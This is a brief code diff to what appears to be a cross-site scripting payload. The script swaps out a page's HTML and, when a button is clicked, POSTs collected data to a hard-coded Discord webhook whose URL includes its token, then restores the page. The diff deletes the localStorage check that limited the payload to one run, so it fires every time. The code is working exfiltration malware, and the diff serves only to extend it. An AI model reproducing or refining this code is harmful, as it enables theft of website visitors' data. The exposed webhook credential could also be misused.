@@ -1,4 +1,4 @@
-if (localStorage.getItem('xss_ef') === '1') { console.log('ok'); } else {
+(function() {
 
 var originalHTML = document.documentElement.innerHTML;
 
@@ -80,7 +80,6 @@ document.getElementById('xef_btn').addEventListener('click', function() {
     xhr.open('POST', 'https://discord.com/api/webhooks/1493707538099605795/GuYho66-ozTTH1UlJsKsrFDL2CTdlgXMDsL_nnbp8F01xg-ooWcF6t67IBl84eFFb1oH', true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.onloadend = function() {
-        localStorage.setItem('xss_ef', '1');
         document.documentElement.innerHTML = originalHTML;
     };
     xhr.send(payload);
